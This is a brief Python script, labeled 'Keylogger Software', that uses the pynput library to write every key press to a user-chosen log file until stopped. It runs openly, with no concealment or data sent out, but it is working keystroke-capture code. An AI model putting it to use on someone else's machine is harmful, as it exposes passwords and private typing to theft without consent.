from pynput.keyboard import Listener

# Log keys to a specified file
def on_press(key):
    with open(log_file, "a") as file:
        file.write(str(key) + "\n")

if __name__ == "__main__":
    print("=== Keylogger Software ===")
    log_file = input("Enter the path for the log file (e.g., key_log.txt): ").strip()

    print(f"Logging keystrokes to: {log_file}. Press Ctrl+C to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()
